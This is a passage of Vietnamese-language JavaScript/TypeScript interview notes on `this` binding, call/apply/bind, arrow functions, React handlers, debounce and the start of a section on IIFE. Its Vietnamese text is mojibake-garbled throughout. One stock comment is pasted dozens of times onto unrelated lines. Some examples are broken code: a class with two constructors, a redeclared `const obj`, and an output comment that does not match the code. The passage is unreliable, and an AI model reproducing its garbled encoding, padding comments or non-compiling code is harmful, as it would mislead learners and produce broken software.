 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

// call: Khi bi·∫øt CH√çNH X√ÅC s·ªë l∆∞·ª£ng arguments
fn.call(obj, arg1, arg2, arg3);

// apply: Khi arguments l√† ARRAY ho·∫∑c ƒê·ªòNG
fn.apply(obj, argsArray);
fn.apply(obj, [...dynamicArgs]);
```

#### **2.4. bind() - T·∫°o function m·ªõi v·ªõi this c·ªë ƒë·ªãnh**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn.
// Tr·∫£ v·ªÅ FUNCTION M·ªöI, KH√îNG g·ªçi ngay!
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function introduce(age: number, city: string): string {
  return `I'm ${this.name}, ${age} years old, from ${city}`;
}

const person = { name: 'John' };

 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn.
const boundIntroduce = introduce.bind(person);

 // Ch√∫ gi·∫£i: G·ªçi function m·ªõi
console.log(boundIntroduce(25, 'HCM')); 
 // Ch√∫ gi·∫£i: "I'm John, 25 years old, from HCM"

// this lu√¥n lu√¥n l√† person, kh√¥ng thay ƒë·ªïi ƒë∆∞·ª£c!
const anotherPerson = { name: 'Alice' };
console.log(boundIntroduce.call(anotherPerson, 30, 'HN')); 
 // Ch√∫ gi·∫£i: "I'm John, 30, from HN"
// ‚ö†Ô∏è V·∫´n l√† "John", kh√¥ng ph·∫£i "Alice"!
// this ƒë√£ b·ªã "kh√≥a c·ª©ng" = person

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: Use case 1: Event handlers
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class Button {
  constructor(public label: string) {}

  // ‚ùå SAI: this s·∫Ω m·∫•t khi l√†m event handler
  handleClickWrong() {
    console.log(this.label); // Ch√∫ gi·∫£i: undefined khi click
  }

  // ‚úÖ ƒê√öNG: Bind this trong constructor
  constructor(public label: string) {
    this.handleClick = this.handleClick.bind(this);
  }

  handleClick() {
    console.log(this.label); // Ch√∫ gi·∫£i: ‚úÖ Works!
  }
}

const btn = new Button('Submit');
document.addEventListener('click', btn.handleClick); 
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: Use case 2: Partial application (Currying)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function multiply(a: number, b: number, c: number): number {
  return a * b * c;
}

// "Kh√≥a" argument ƒë·∫ßu ti√™n = 2
const double = multiply.bind(null, 2); 
 // Ch√∫ gi·∫£i: double = (b, c) => 2 * b * c

console.log(double(3, 4)); // Ch√∫ gi·∫£i: 2 * 3 * 4 = 24
console.log(double(5, 6)); // Ch√∫ gi·∫£i: 2 * 5 * 6 = 60

// "Kh√≥a" 2 arguments ƒë·∫ßu
const multiplyBy2And3 = multiply.bind(null, 2, 3);
 // Ch√∫ gi·∫£i: multiplyBy2And3 = (c) => 2 * 3 * c

console.log(multiplyBy2And3(4)); // Ch√∫ gi·∫£i: 2 * 3 * 4 = 24

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // `setTimeout`/`setInterval` n·∫±m trong macrotasks; nh·ªõ clear khi kh√¥ng c·∫ßn ƒë·ªÉ tr√°nh r√≤ r·ªâ b·ªô nh·ªõ.
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class Timer {
  constructor(public count: number = 0) {}

 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. `setTimeout`/`setInterval` n·∫±m trong macrotasks; nh·ªõ clear khi kh√¥ng c·∫ßn ƒë·ªÉ tr√°nh r√≤ r·ªâ b·ªô nh·ªõ.
  startWrong() {
    setTimeout(function() {
      this.count++; // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
      console.log(this.count);
    }, 1000);
  }

  // ‚úÖ ƒê√öNG: Bind this
  startBind() {
    setTimeout(function() {
      this.count++; // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
      console.log(this.count);
    }.bind(this), 1000);
  }

  // ‚úÖ ƒê√öNG: Arrow function (khuy·∫øn ngh·ªã)
  startArrow() {
    setTimeout(() => {
      this.count++; // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
      console.log(this.count);
    }, 1000);
  }
}
```

---

### **3. So S√°nh T·ªïng Quan**

#### **3.1. Arrow vs Regular Functions**

| Feature | Arrow Function | Regular Function |
|---------|---------------|------------------|
| **Syntax** | `() => {}` | `function() {}` |
| **this binding** | Lexical (t·ª´ outer scope) | Dynamic (runtime) |
| **arguments** | ‚ùå Kh√¥ng c√≥ | ‚úÖ C√≥ |
| **Constructor** | ‚ùå Kh√¥ng d√πng `new` | ‚úÖ D√πng ƒë∆∞·ª£c `new` |
| **Hoisting** | ‚ùå Kh√¥ng hoisted | ‚úÖ Hoisted |
| **prototype** | ‚ùå undefined | ‚úÖ C√≥ prototype |
| **Method** | ‚ùå Kh√¥ng n√™n d√πng | ‚úÖ N√™n d√πng |
| **Callback** | ‚úÖ N√™n d√πng | ‚ùå M·∫•t this |

#### **3.2. call vs apply vs bind**

| Method | Syntax | Invoke ngay? | Use case |
|--------|--------|--------------|----------|
| **call** | `fn.call(thisArg, arg1, arg2)` | ‚úÖ C√≥ | Bi·∫øt ch√≠nh x√°c s·ªë arguments |
| **apply** | `fn.apply(thisArg, [args])` | ‚úÖ C√≥ | Arguments l√† array |
| **bind** | `fn.bind(thisArg, arg1)` | ‚ùå Kh√¥ng | Event handlers, partial application |

---

### **4. Best Practices & Common Mistakes**

#### **4.1. Best Practices**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: ‚úÖ BEST PRACTICES
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
const numbers = [1, 2, 3, 4, 5];
const doubled = numbers.map(n => n * 2); // Ch√∫ gi·∫£i: ‚úÖ Clean

 // Ch√∫ gi·∫£i: 2Ô∏è‚É£ Regular functions cho OBJECT METHODS
const user = {
  name: 'John',
  greet() { // Ch√∫ gi·∫£i: ‚úÖ Shorthand method syntax
    console.log(`Hello, ${this.name}`);
  }
};

// 3Ô∏è‚É£ Arrow functions cho NESTED FUNCTIONS (tr√°nh m·∫•t this)
class Component {
  data = [];
  
  fetchData() {
    fetch('/api/data')
      .then(response => response.json())
      .then(data => {
        this.data = data; // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
      });
  }
}

 // D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn. Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
class Button {
  constructor() {
    this.handleClick = this.handleClick.bind(this); // Ch√∫ gi·∫£i: ‚úÖ
  }
  
  handleClick() {
    console.log(this); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  }
}

// 5Ô∏è‚É£ Ho·∫∑c d√πng CLASS FIELDS v·ªõi arrow (modern)
class ButtonModern {
  handleClick = () => {
    console.log(this); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
  }
}
```

#### **4.2. Common Mistakes**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: ‚ùå COMMON MISTAKES
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
const obj = {
  name: 'John',
  greet: () => {
    console.log(this.name); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  }
};

// ‚úÖ Fix: D√πng regular function ho·∫∑c method shorthand
const obj = {
  name: 'John',
  greet() {
    console.log(this.name); // Ch√∫ gi·∫£i: ‚úÖ "John"
  }
};

// ‚ùå 2. Qu√™n bind this cho event handlers
class Component {
  name = 'MyComponent';
  
  handleClick() {
    console.log(this.name); // Ch√∫ gi·∫£i: ‚ùå undefined
  }
  
  componentDidMount() {
    button.addEventListener('click', this.handleClick);
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  }
}

// ‚úÖ Fix: Bind ho·∫∑c arrow function
class Component {
  name = 'MyComponent';
  
 // D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn. Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
  constructor() {
    this.handleClick = this.handleClick.bind(this);
  }
  
  handleClick() {
    console.log(this.name); // Ch√∫ gi·∫£i: ‚úÖ "MyComponent"
  }
  
  // Option 2: Arrow function (khuy·∫øn ngh·ªã)
  handleClickArrow = () => {
    console.log(this.name); // Ch√∫ gi·∫£i: ‚úÖ "MyComponent"
  }
}

// ‚ùå 3. D√πng arguments trong arrow function
const sum = (...numbers) => {
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
  console.log(numbers); // ‚úÖ D√πng rest parameters
  return numbers.reduce((a, b) => a + b, 0);
};

// ‚ùå 4. Bind nhi·ªÅu l·∫ßn (kh√¥ng c·∫ßn thi·∫øt)
const fn = function() { console.log(this.name); };
const obj = { name: 'John' };

const bound1 = fn.bind(obj);
const bound2 = bound1.bind({ name: 'Alice' });
bound2(); // "John" - ‚ùå Bind ch·ªâ c√≥ hi·ªáu l·ª±c l·∫ßn ƒë·∫ßu!

 // D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn.
fn.call(obj); // Ch√∫ gi·∫£i: ‚úÖ G·ªçi NGAY
fn.apply(obj); // Ch√∫ gi·∫£i: ‚úÖ G·ªçi NGAY
fn.bind(obj);   // ‚ùå KH√îNG g·ªçi, tr·∫£ v·ªÅ function m·ªõi!
fn.bind(obj)(); // ‚úÖ Ph·∫£i g·ªçi th√™m ()
```

---

### **5. Real-World Examples**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: REACT COMPONENT
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

class TodoList extends React.Component {
  state = {
    todos: [],
    newTodo: ''
  };

 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn. H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
  handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    this.setState({ newTodo: e.target.value });
  }

 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn. H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
  addTodo = () => {
    this.setState(prev => ({
      todos: [...prev.todos, prev.newTodo],
      newTodo: ''
    }));
  }

 // Ch√∫ gi·∫£i: ‚úÖ Regular function OK cho lifecycle methods
  componentDidMount() {
 // Ch√∫ gi·∫£i: Fetch data...
    fetch('/api/todos')
      .then(res => res.json())
      .then(todos => {
        this.setState({ todos }); // H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
      });
  }

  render() {
    return (
      <div>
        <input 
          value={this.state.newTodo}
          onChange={this.handleInputChange} // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn.
        />
        <button onClick={this.addTodo}>Add</button>
      </div>
    );
  }
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn.
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function debounce<T extends (...args: any[]) => any>(
  fn: T,
  delay: number
): (...args: Parameters<T>) => void {
  let timeoutId: NodeJS.Timeout;

  return function(this: any, ...args: Parameters<T>) {
    clearTimeout(timeoutId);
    
    timeoutId = setTimeout(() => {
      fn.apply(this, args); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
    }, delay);
  };
}

class SearchBox {
  searchTerm = '';

  search(query: string) {
    console.log(`Searching for: ${query}`);
    console.log(`Current term: ${this.searchTerm}`);
  }

 // D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn.
  debouncedSearch = debounce(this.search, 300).bind(this);
}
```

---

### **üí° Key Takeaways**

**Arrow Functions:**
- ‚úÖ D√πng cho callbacks, array methods (map, filter, forEach...)
- ‚úÖ D√πng khi mu·ªën gi·ªØ this t·ª´ outer scope
- ‚ùå Kh√¥ng d√πng cho object methods
- ‚ùå Kh√¥ng d√πng l√†m constructors

**Regular Functions:**
- ‚úÖ D√πng cho object methods
- ‚úÖ D√πng khi c·∫ßn arguments object
- ‚úÖ D√πng l√†m constructors
- ‚ùå D·ªÖ m·∫•t this trong callbacks (ph·∫£i bind)

**call/apply/bind:**
- üìû **call**: G·ªçi ngay v·ªõi args ri√™ng l·∫ª ‚Üí function borrowing
- üìã **apply**: G·ªçi ngay v·ªõi array args ‚Üí Math.max(array)
- üîó **bind**: T·∫°o function m·ªõi ‚Üí event handlers, partial application

**Remember:**
> "Arrow function = lexical this (t·ª´ outer scope). Regular function = dynamic this (runtime). D√πng call/apply khi c·∫ßn g·ªçi ngay, bind khi c·∫ßn function m·ªõi v·ªõi this c·ªë ƒë·ªãnh!" üéØ
---
## 10. üéØ Q10: IIFE (Immediately Invoked Function Expression) & Functional Programming  

**P1: T√™n c√¢u h·ªèi:** üéØ Q10: IIFE (Immediately Invoked Function Expression) & Functional Programming  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"IIFE l√† function execute ngay sau khi define ƒë·ªÉ t·∫°o private scope, c√≤n Functional Programming bao g·ªìm pure functions, immutability, currying v√† higher-order functions."**

**üîë 4 Kh√°i Ni·ªám Ch√≠nh:**

**1. IIFE (Immediately Invoked Function Expression):**
- Syntax: `(function(){ ... })()` ho·∫∑c `(() => { ... })()`
- **T·∫°o scope ri√™ng** ‚Üí tr√°nh pollute global namespace
- Use case: Module pattern (tr∆∞·ªõc ES6 modules), private variables, avoid variable hoisting conflicts
- **V√≠ d·ª•**: `const counter = (function(){ let count=0; return {inc: ()=>++count} })()`

**2. Pure Functions:**
- **Same input ‚Üí same output**, kh√¥ng c√≥ side effects (kh√¥ng modify external state)
- **Predictable**, d·ªÖ test, d·ªÖ debug
- V√≠ d·ª•: `add(a,b) => a+b` (pure) vs `arr.push(x)` (impure - mutate arr)

**3. Currying:**
- Transform `f(a,b,c)` th√†nh `f(a)(b)(c)` - **partial application**
